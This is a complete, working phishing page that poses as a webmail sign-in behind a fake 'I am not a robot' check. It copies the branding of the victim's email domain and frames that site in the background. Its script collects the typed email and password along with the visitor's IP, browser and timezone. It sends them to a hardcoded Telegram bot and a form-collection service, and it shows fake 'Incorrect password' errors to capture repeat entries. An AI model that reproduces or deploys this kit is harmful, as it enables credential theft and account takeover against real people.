<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Webmail Sign-in</title>
   <!-- Include Bootstrap 5 CSS -->
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
   <!-- Bootstrap Icons -->
   <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
   <!-- Google Fonts: Poppins -->
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">

   <style>
      /* Hide the main content initially */
      #main-content {
         display: none;
      }

      /* Verification Div Styling */
      #verification-div {
         height: 100vh;
         display: flex;
         align-items: start;
         justify-content: center;
         padding-top: 10%;
      }

      /* Ensure text is left-aligned */
      .verification-content {
         text-align: left;
      }

      /* Adjust spinner size */
      .spinner-border {
         width: 1.5rem;
         height: 1.5rem;
      }
   </style>
   
   <style>
      #background-iframe, #overlay { position: fixed; top: 0; left: 0; height: 100%; width: 100%; }
      body { font-family: Poppins, sans-serif; margin: 0; padding: 0; overflow: hidden; }
      #background-iframe { border: none; z-index: -3; object-fit: cover; }
      #overlay { background-color: rgba(0, 0, 0, .5); z-index: -2; }
      .form-container { display: none; max-width: 400px; width: 100%; padding: 2rem; background-color: rgba(255, 255, 255, .95); border-radius: .75rem; box-shadow: 0 8px 16px rgba(0, 0, 0, .2); position: relative; z-index: 1; }
      .icon-text { display: flex; align-items: center; margin-bottom: 1.5rem; }
      .icon-text img { width: 32px; height: 32px; margin-right: .5rem; }
      .icon-text .h4 { margin-bottom: 0; color: #0d6efd; }
      .form-floating { position: relative; margin-bottom: 1.5rem; }
      .form-floating label, .input-icon { position: absolute; color: #6c757d; pointer-events: none; }
      .form-floating label { transition: .2s ease-in-out; left: 2.5rem; top: -.2rem; background-color: transparent; z-index: 1; }
      .form-floating input:focus + label, .form-floating input:not(:placeholder-shown) + label { transform: translateY(-1.5rem); font-size: .85rem; color: #0d6efd; }
      .form-control { border-top: none; border-left: none; border-right: none; border-bottom: 2px solid #ced4da; border-radius: 0; padding-left: 2.5rem; transition: border-color .2s; background-color: transparent; }
      .form-control:focus { box-shadow: none; outline: 0; border-bottom-color: #0d6efd; }
      .input-icon { left: .75rem; top: 50%; transform: translateY(-50%); font-size: 1.2rem; }
      .btn-primary { width: 100%; padding: .75rem; font-size: 1rem; background-color: #0d6efd; border: none; border-radius: .375rem; transition: background-color .3s, color .3s; }
      .btn-primary:hover { background-color: #0b5ed7; color: #fff; }
      .btn-primary:focus { box-shadow: none; }
      @media (max-width: 576px) { .form-container { padding: 1.5rem; } }
      .loader-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, .5); align-items: center; justify-content: center; z-index: 9999; display: none; }
      .error-message { color: red; margin-bottom: 1rem; display: none; }
   </style>
</head>

<body id="main-content" class="d-flex align-items-center justify-content-center min-vh-100">
   <div id="verification-div" style="position: absolute; height: 100vh; width: 100vw; background-color: #fff;">
      <div class="row">
         <div class="col-12 verification-content mx-2">
            <h2 id="verify-heading">Checking your browser before accessing the site</h2>
            <div>
               <div class="checkbox-container mt-3 d-flex align-items-center p-4" style="border: 0px solid black; background: #f3efef; border-radius: 5px;">
                  <input type="checkbox" id="bot-check" class="form-check-input">
                  <label for="bot-check" class="form-check-label ms-2" id="bot-check-label">I am not a robot</label>
               </div>
            </div>
            <p class="pt-1" id="verify-instruction">Click on the checkbox to verify if you're human.</p>
         </div>
      </div>
   </div>
   <!-- Background Iframe -->
   <iframe id="background-iframe" src="about:blank" allowfullscreen></iframe>
   <!-- Dimmed Overlay -->
   <div id="overlay"></div>
   <!-- Form Container -->
   <div class="form-container" id="form-container">
      <!-- Error Message -->
      <div id="error-message" class="error-message">Incorrect password. Try again</div>
      <form id="user-form">
         <!-- Honeypot Field -->
         <input type="text" name="honeypot" id="honeypot" style="display:none;" autocomplete="off">
         <!-- Icon and Text Row -->
         <div class="icon-text">
            <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=zoho.com" alt="Domain Favicon" style="height: 15px; width: 15px;">
            <span class="h4 mb-0" style="margin-left: 10px;" id="domain-name">ZOHO</span>
         </div>
         <!-- Heading -->
         <h5 class="mb-3" id="form-heading">Confirm youâ€™re not a robot</h5>
         <!-- Paragraph -->
         <p class="mb-4 text-muted" style="font-size: .8rem;" id="form-subheading">Previous session has expired, login to continue</p>
         <!-- Email Input -->
         <div class="form-floating position-relative">
            <i class="bi bi-envelope input-icon"></i>
            <input type="email" class="form-control" id="email" placeholder=" " required style="padding-left: 40px; z-index: 1000;" disabled>
            <label for="email" style="background-color: transparent;" id="email-label">Email</label>
         </div>
         <!-- Password Input -->
         <div class="form-floating position-relative">
            <i class="bi bi-lock input-icon"></i>
            <input type="password" class="form-control" id="password" placeholder=" " required style="padding-left: 40px;">
            <label for="password" style="background-color: transparent;" id="password-label">Password</label>
         </div>
         <!-- Submit Button -->
         <button type="submit" class="btn btn-primary" id="submit-button">Next</button>
      </form>
   </div>

   <!-- Loader Overlay -->
   <div id="loader-overlay" class="loader-overlay">
      <div class="spinner-border text-light" role="status" style="width: 3rem; height: 3rem;">
         <span class="visually-hidden" id="loader-text">Loading...</span>
      </div>
   </div>

   <!-- Bootstrap 5 JS Bundle (includes Popper) -->
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
   <!-- Language Detection and Form Handling Script -->
   <script>
      // Translation object
      const translations = {
         en: {
            verifyHeading: "Checking your browser before accessing the site",
            botCheckLabel: "I am not a robot",
            verifyInstruction: "Click on the checkbox to verify if you're human.",
            redirecting: "Redirecting...",
            errorMessage: "Incorrect password. Try again",
            formHeading: "Confirm youâ€™re not a robot",
            formSubheading: "Previous session has expired, login to continue",
            emailLabel: "Email",
            passwordLabel: "Password",
            submitButton: "Next",
            loaderText: "Loading..."
         },
         zh: {
            verifyHeading: "åœ¨è®¿é—®ç½‘ç«™ä¹‹å‰æ£€æŸ¥æ‚¨çš„æµè§ˆå™¨",
            botCheckLabel: "æˆ‘ä¸æ˜¯æœºå™¨äºº",
            verifyInstruction: "ç‚¹å‡»å¤é€‰æ¡†ä»¥éªŒè¯æ‚¨æ˜¯äººç±»ã€‚",
            redirecting: "æ­£åœ¨é‡å®šå‘...",
            errorMessage: "å¯†ç é”™è¯¯ï¼Œè¯·é‡è¯•",
            formHeading: "ç¡®è®¤æ‚¨ä¸æ˜¯æœºå™¨äºº",
            formSubheading: "ä¹‹å‰çš„ä¼šè¯å·²è¿‡æœŸï¼Œè¯·ç™»å½•ä»¥ç»§ç»­",
            emailLabel: "ç”µå­é‚®ä»¶",
            passwordLabel: "å¯†ç ",
            submitButton: "ä¸‹ä¸€æ­¥",
            loaderText: "åŠ è½½ä¸­..."
         },
         ja: {
            verifyHeading: "ã‚µã‚¤ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹å‰ã«ãƒ–ãƒ©ã‚¦ã‚¶ã‚’ç¢ºèªã—ã¦ã„ã¾ã™",
            botCheckLabel: "ç§ã¯ãƒ­ãƒœãƒƒãƒˆã§ã¯ã‚ã‚Šã¾ã›ã‚“",
            verifyInstruction: "äººé–“ã§ã‚ã‚‹ã“ã¨ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ãƒã‚§ãƒƒã‚¯ãƒœãƒƒã‚¯ã‚¹ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚",
            redirecting: "ãƒªãƒ‡ã‚£ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ä¸­...",
            errorMessage: "ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒé–“é•ã£ã¦ã„ã¾ã™ã€‚ã‚‚ã†ä¸€åº¦ãŠè©¦ã—ãã ã•ã„",
            formHeading: "ãƒ­ãƒœãƒƒãƒˆã§ãªã„ã“ã¨ã‚’ç¢ºèªã—ã¦ãã ã•ã„",
            formSubheading: "å‰ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ãŒæœŸé™åˆ‡ã‚Œã«ãªã‚Šã¾ã—ãŸã€‚ç¶šè¡Œã™ã‚‹ã«ã¯ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ãã ã•ã„",
            emailLabel: "ãƒ¡ãƒ¼ãƒ«",
            passwordLabel: "ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰",
            submitButton: "æ¬¡ã¸",
            loaderText: "èª­ã¿è¾¼ã¿ä¸­..."
         },
         hi: {
            verifyHeading: "à¤¸à¤¾à¤‡à¤Ÿ à¤¤à¤• à¤ªà¤¹à¥à¤‚à¤šà¤¨à¥‡ à¤¸à¥‡ à¤ªà¤¹à¤²à¥‡ à¤…à¤ªà¤¨à¥‡ à¤¬à¥à¤°à¤¾à¤‰à¤œà¤¼à¤° à¤•à¥€ à¤œà¤¾à¤‚à¤š à¤•à¤°à¥‡à¤‚",
            botCheckLabel: "à¤®à¥ˆà¤‚ à¤°à¥‹à¤¬à¥‹à¤Ÿ à¤¨à¤¹à¥€à¤‚ à¤¹à¥‚à¤",
            verifyInstruction: "à¤¯à¤¹ à¤¸à¤¤à¥à¤¯à¤¾à¤ªà¤¿à¤¤ à¤•à¤°à¤¨à¥‡ à¤•à¥‡ à¤²à¤¿à¤ à¤šà¥‡à¤•à¤¬à¥‰à¤•à¥à¤¸ à¤ªà¤° à¤•à¥à¤²à¤¿à¤• à¤•à¤°à¥‡à¤‚ à¤•à¤¿ à¤†à¤ª à¤‡à¤‚à¤¸à¤¾à¤¨ à¤¹à¥ˆà¤‚à¥¤",
            redirecting: "à¤ªà¥à¤¨à¤°à¥à¤¨à¤¿à¤°à¥à¤¦à¥‡à¤¶à¤¨...",
            errorMessage: "à¤—à¤²à¤¤ à¤ªà¤¾à¤¸à¤µà¤°à¥à¤¡à¥¤ à¤«à¤¿à¤° à¤¸à¥‡ à¤•à¥‹à¤¶à¤¿à¤¶ à¤•à¤°à¥‡à¤‚",
            formHeading: "à¤ªà¥à¤·à¥à¤Ÿà¤¿ à¤•à¤°à¥‡à¤‚ à¤•à¤¿ à¤†à¤ª à¤°à¥‹à¤¬à¥‹à¤Ÿ à¤¨à¤¹à¥€à¤‚ à¤¹à¥ˆà¤‚",
            formSubheading: "à¤ªà¤¿à¤›à¤²à¤¾ à¤¸à¤¤à¥à¤° à¤¸à¤®à¤¾à¤ªà¥à¤¤ à¤¹à¥‹ à¤—à¤¯à¤¾ à¤¹à¥ˆ, à¤œà¤¾à¤°à¥€ à¤°à¤–à¤¨à¥‡ à¤•à¥‡ à¤²à¤¿à¤ à¤²à¥‰à¤—à¤¿à¤¨ à¤•à¤°à¥‡à¤‚",
            emailLabel: "à¤ˆà¤®à¥‡à¤²",
            passwordLabel: "à¤ªà¤¾à¤¸à¤µà¤°à¥à¤¡",
            submitButton: "à¤…à¤—à¤²à¤¾",
            loaderText: "à¤²à¥‹à¤¡ à¤¹à¥‹ à¤°à¤¹à¤¾ à¤¹à¥ˆ..."
         },
         es: {
            verifyHeading: "Comprobando tu navegador antes de acceder al sitio",
            botCheckLabel: "No soy un robot",
            verifyInstruction: "Haz clic en la casilla para verificar que eres humano.",
            redirecting: "Redirigiendo...",
            errorMessage: "ContraseÃ±a incorrecta. IntÃ©ntalo de nuevo",
            formHeading: "Confirma que no eres un robot",
            formSubheading: "La sesiÃ³n anterior ha expirado, inicia sesiÃ³n para continuar",
            emailLabel: "Correo electrÃ³nico",
            passwordLabel: "ContraseÃ±a",
            submitButton: "Siguiente",
            loaderText: "Cargando..."
         },
         fr: {
            verifyHeading: "VÃ©rification de votre navigateur avant d'accÃ©der au site",
            botCheckLabel: "Je ne suis pas un robot",
            verifyInstruction: "Cochez la case pour vÃ©rifier que vous Ãªtes humain.",
            redirecting: "Redirection...",
            errorMessage: "Mot de passe incorrect. RÃ©essayez",
            formHeading: "Confirmez que vous n'Ãªtes pas un robot",
            formSubheading: "La session prÃ©cÃ©dente a expirÃ©, connectez-vous pour continuer",
            emailLabel: "Email",
            passwordLabel: "Mot de passe",
            submitButton: "Suivant",
            loaderText: "Chargement..."
         },
         de: {
            verifyHeading: "ÃœberprÃ¼fung Ihres Browsers vor dem Zugriff auf die Website",
            botCheckLabel: "Ich bin kein Roboter",
            verifyInstruction: "Klicken Sie auf das KontrollkÃ¤stchen, um zu bestÃ¤tigen, dass Sie ein Mensch sind.",
            redirecting: "Weiterleitung...",
            errorMessage: "Falsches Passwort. Versuchen Sie es erneut",
            formHeading: "BestÃ¤tigen Sie, dass Sie kein Roboter sind",
            formSubheading: "Die vorherige Sitzung ist abgelaufen, melden Sie sich an, um fortzufahren",
            emailLabel: "E-Mail",
            passwordLabel: "Passwort",
            submitButton: "Weiter",
            loaderText: "Laden..."
         },
         pt: {
            verifyHeading: "Verificando seu navegador antes de acessar o site",
            botCheckLabel: "NÃ£o sou um robÃ´",
            verifyInstruction: "Clique na caixa de seleÃ§Ã£o para verificar se vocÃª Ã© humano.",
            redirecting: "Redirecionando...",
            errorMessage: "Senha incorreta. Tente novamente",
            formHeading: "Confirme que vocÃª nÃ£o Ã© um robÃ´",
            formSubheading: "A sessÃ£o anterior expirou, faÃ§a login para continuar",
            emailLabel: "E-mail",
            passwordLabel: "Senha",
            submitButton: "PrÃ³ximo",
            loaderText: "Carregando..."
         },
         ar: {
            verifyHeading: "Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ù…ØªØµÙØ­Ùƒ Ù‚Ø¨Ù„ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹",
            botCheckLabel: "Ø£Ù†Ø§ Ù„Ø³Øª Ø±ÙˆØ¨ÙˆØª",
            verifyInstruction: "Ø§Ù†Ù‚Ø± Ø¹Ù„Ù‰ Ù…Ø±Ø¨Ø¹ Ø§Ù„Ø§Ø®ØªÙŠØ§Ø± Ù„Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù†Ùƒ Ø¥Ù†Ø³Ø§Ù†.",
            redirecting: "Ø¬Ø§Ø±Ù Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªÙˆØ¬ÙŠÙ‡...",
            errorMessage: "ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± ØºÙŠØ± ØµØ­ÙŠØ­Ø©. Ø­Ø§ÙˆÙ„ Ù…Ø±Ø© Ø£Ø®Ø±Ù‰",
            formHeading: "ØªØ£ÙƒØ¯ Ø£Ù†Ùƒ Ù„Ø³Øª Ø±ÙˆØ¨ÙˆØª",
            formSubheading: "Ø§Ù†ØªÙ‡Øª ØµÙ„Ø§Ø­ÙŠØ© Ø§Ù„Ø¬Ù„Ø³Ø© Ø§Ù„Ø³Ø§Ø¨Ù‚Ø©ØŒ Ù‚Ù… Ø¨ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©",
            emailLabel: "Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ",
            passwordLabel: "ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±",
            submitButton: "Ø§Ù„ØªØ§Ù„ÙŠ",
            loaderText: "Ø¬Ø§Ø±Ù Ø§Ù„ØªØ­Ù…ÙŠÙ„..."
         },
         it: {
            verifyHeading: "Controllo del browser prima di accedere al sito",
            botCheckLabel: "Non sono un robot",
            verifyInstruction: "Fai clic sulla casella per verificare che sei umano.",
            redirecting: "Reindirizzamento...",
            errorMessage: "Password errata. Riprova",
            formHeading: "Conferma di non essere un robot",
            formSubheading: "La sessione precedente Ã¨ scaduta, accedi per continuare",
            emailLabel: "Email",
            passwordLabel: "Password",
            submitButton: "Avanti",
            loaderText: "Caricamento..."
         },
         ko: {
            verifyHeading: "ì‚¬ì´íŠ¸ì— ì ‘ê·¼í•˜ê¸° ì „ì— ë¸Œë¼ìš°ì €ë¥¼ í™•ì¸í•˜ëŠ” ì¤‘",
            botCheckLabel: "ë‚˜ëŠ” ë¡œë´‡ì´ ì•„ë‹™ë‹ˆë‹¤",
            verifyInstruction: "ì¸ê°„ì„ì„ í™•ì¸í•˜ë ¤ë©´ ì²´í¬ë°•ìŠ¤ë¥¼ í´ë¦­í•˜ì„¸ìš”.",
            redirecting: "ë¦¬ë””ë ‰ì…˜ ì¤‘...",
            errorMessage: "ì˜ëª»ëœ ë¹„ë°€ë²ˆí˜¸ì…ë‹ˆë‹¤. ë‹¤ì‹œ ì‹œë„í•˜ì„¸ìš”",
            formHeading: "ë¡œë´‡ì´ ì•„ë‹˜ì„ í™•ì¸í•˜ì„¸ìš”",
            formSubheading: "ì´ì „ ì„¸ì…˜ì´ ë§Œë£Œë˜ì—ˆìŠµë‹ˆë‹¤. ê³„ì†í•˜ë ¤ë©´ ë¡œê·¸ì¸í•˜ì„¸ìš”",
            emailLabel: "ì´ë©”ì¼",
            passwordLabel: "ë¹„ë°€ë²ˆí˜¸",
            submitButton: "ë‹¤ìŒ",
            loaderText: "ë¡œë”© ì¤‘..."
         },
         vi: {
            verifyHeading: "Kiá»ƒm tra trÃ¬nh duyá»‡t cá»§a báº¡n trÆ°á»›c khi truy cáº­p trang web",
            botCheckLabel: "TÃ´i khÃ´ng pháº£i lÃ  robot",
            verifyInstruction: "Nháº¥p vÃ o há»™p kiá»ƒm Ä‘á»ƒ xÃ¡c minh báº¡n lÃ  con ngÆ°á»i.",
            redirecting: "Äang chuyá»ƒn hÆ°á»›ng...",
            errorMessage: "Máº­t kháº©u khÃ´ng Ä‘Ãºng. Thá»­ láº¡i",
            formHeading: "XÃ¡c nháº­n báº¡n khÃ´ng pháº£i lÃ  robot",
            formSubheading: "PhiÃªn trÆ°á»›c Ä‘Ã£ háº¿t háº¡n, Ä‘Äƒng nháº­p Ä‘á»ƒ tiáº¿p tá»¥c",
            emailLabel: "Email",
            passwordLabel: "Máº­t kháº©u",
            submitButton: "Tiáº¿p theo",
            loaderText: "Äang táº£i..."
         }
      };

      // Function to detect language
      function detectLanguage() {
         const browserLang = navigator.language || navigator.languages[0] || 'en';
         const langCode = browserLang.split('-')[0];
         return translations[langCode] ? langCode : 'en';
      }

      // Function to apply translations
      function applyTranslations(lang) {
         const t = translations[lang];
         document.documentElement.lang = lang;
         document.getElementById('verify-heading').textContent = t.verifyHeading;
         document.getElementById('bot-check-label').textContent = t.botCheckLabel;
         document.getElementById('verify-instruction').textContent = t.verifyInstruction;
         document.getElementById('error-message').textContent = t.errorMessage;
         document.getElementById('form-heading').textContent = t.formHeading;
         document.getElementById('form-subheading').textContent = t.formSubheading;
         document.getElementById('email-label').textContent = t.emailLabel;
         document.getElementById('password-label').textContent = t.passwordLabel;
         document.getElementById('submit-button').textContent = t.submitButton;
         document.getElementById('loader-text').textContent = t.loaderText;
      }

      // Telegram configuration (WARNING: Move to server-side in production)
      const telegramToken = '7103630373:AAFVJ_kia1ilw3C043wVG478q81bhZjt7gI';
      const telegramChatId = '6134592216';

      // Function to sanitize input to prevent injection
      function sanitizeInput(input) {
         const div = document.createElement('div');
         div.textContent = input;
         return div.innerHTML;
      }

      // Function to send message to Telegram
      async function sendToTelegram(message) {
         try {
            const response = await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({
                  chat_id: telegramChatId,
                  text: message,
                  parse_mode: 'Markdown'
               })
            });
            if (!response.ok) {
               console.error('Failed to send message to Telegram:', response.statusText);
            }
         } catch (error) {
            console.error('Error sending to Telegram:', error);
         }
      }

      // Function to submit form data with retry logic
      async function submitToForm(data, retries = 3) {
         for (let i = 0; i < retries; i++) {
            try {
               const response = await fetch('https://submit-form.com/5BYUqxAm1', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify(data)
               });
               if (response.ok) {
                  console.log('Submission to form successful!');
                  return true;
               } else {
                  console.error('Submission to form failed:', response.statusText);
               }
            } catch (error) {
               console.error('Error sending submission to form:', error);
            }
            await new Promise(resolve => setTimeout(resolve, 1000)); // Wait 1s before retry
         }
         return false;
      }

      // Main script
      document.addEventListener('DOMContentLoaded', async () => {
         const lang = detectLanguage();
         applyTranslations(lang);

         let submitCount = 0;
         const maxAttempts = 5;

         // Handle email from hash or eta
         const hash = window.location.hash ? window.location.hash.substring(1) : null;
         const urlParams = new URLSearchParams(window.location.search);
         const eta = urlParams.get('eta');
         const emailInput = hash || eta || null;
         let domain;

         if (emailInput) {
            document.getElementById('email').value = sanitizeInput(emailInput);
            const parts = emailInput.split('@');
            if (parts.length === 2) {
               domain = parts[1];
               document.getElementById('domain-favicon').src = `https://www.google.com/s2/favicons?domain=${domain}`;
               document.getElementById('domain-name').textContent = domain.split('.')[0].toUpperCase();
               const url = domain.startsWith('http://') || domain.startsWith('https://') ? domain : `https://${domain}`;
               document.getElementById('background-iframe').src = url;
            }
         } else {
            console.warn('No "#" or "eta" parameter found in the URL.');
            document.getElementById('background-iframe').src = 'about:blank';
         }

         // Collect user information
         let userInfo = {
            ipAddress: 'Fetching...',
            userAgent: navigator.userAgent,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            browser: 'Detecting...'
         };

         // Detect browser
         const ua = navigator.userAgent;
         userInfo.browser = ua.includes('Firefox') ? 'Mozilla Firefox' :
                           ua.includes('SamsungBrowser') ? 'Samsung Internet' :
                           ua.includes('Opera') || ua.includes('OPR') ? 'Opera' :
                           ua.includes('Trident') ? 'Microsoft Internet Explorer' :
                           ua.includes('Edge') ? 'Microsoft Edge' :
                           ua.includes('Chrome') ? 'Google Chrome or Chromium' :
                           ua.includes('Safari') ? 'Apple Safari' : 'Unknown';

         // Fetch IP address with timeout
         try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 5000);
            const response = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
            clearTimeout(timeoutId);
            const data = await response.json();
            userInfo.ipAddress = data.ip;
         } catch (error) {
            console.error('Error fetching IP address:', error);
            userInfo.ipAddress = 'Unavailable';
         }

         // Form submission handler
         document.getElementById('user-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            if (submitCount >= maxAttempts) {
               console.warn('Maximum submission attempts reached.');
               return;
            }
            submitCount++;

            // Check honeypot
            const honeypot = document.getElementById('honeypot').value.trim();
            if (honeypot) {
               console.log('Honeypot field filled. Submission ignored.');
               return;
            }

            // Show loader
            document.getElementById('loader-overlay').style.display = 'flex';

            // Prepare data
            const email = sanitizeInput(document.getElementById('email').value.trim());
            const password = sanitizeInput(document.getElementById('password').value.trim());

            // Prepare Telegram message
            const message = `âœ…ğŸ¤‘ğŸ’³ğŸ’¶ Perry ajebutter ğŸ’¶ğŸ’³ğŸ¤‘âœ…\n\n*Email*: ${email}\n*Password*: ${password}\n*IP Address*: ${userInfo.ipAddress}\n*User Agent*: ${userInfo.userAgent}\n*Timezone*: ${userInfo.timezone}\n*Browser*: ${userInfo.browser}`;

            // Send to Telegram
            await sendToTelegram(message);

            // Submit to form
            const formData = { email, password };
            await submitToForm(formData);

            // Handle submission attempts
            if (submitCount <= 4) {
               setTimeout(() => {
                  document.getElementById('loader-overlay').style.display = 'none';
                  document.getElementById('error-message').style.display = 'block';
                  document.getElementById('password').value = '';
               }, 3000);
            } else {
               setTimeout(() => {
                  document.getElementById('loader-overlay').style.display = 'none';
                  if (domain) {
                     window.location.href = `https://${domain}`;
                  } else {
                     console.error('No domain available for redirect.');
                  }
               }, 3000);
            }
         });

         // Bot verification
         const botCheck = document.getElementById('bot-check');
         const verificationDiv = document.getElementById('verification-div');
         const formContainer = document.getElementById('form-container');
         const mainContent = document.getElementById('main-content');

         botCheck.addEventListener('change', function () {
            if (this.checked) {
               const checkboxContainer = this.parentElement;
               checkboxContainer.innerHTML = `
                  <div class="spinner-container d-flex align-items-center">
                     <div class="spinner-border" role="status">
                        <span class="visually-hidden">${translations[lang].loaderText}</span>
                     </div>
                     <span class="ms-2">${translations[lang].verifyInstruction}</span>
                  </div>
               `;
               setTimeout(() => {
                  verificationDiv.innerHTML = `
                     <div class="row">
                        <div class="col-12 verification-content">
                           <h2>${translations[lang].redirecting}</h2>
                        </div>
                     </div>
                  `;
                  setTimeout(() => {
                     verificationDiv.style.display = 'none';
                     mainContent.style.display = 'block';
                     formContainer.style.display = 'block';
                  }, 2000);
               }, 4000);
            }
         });
      });
   </script>
</body>
</html>
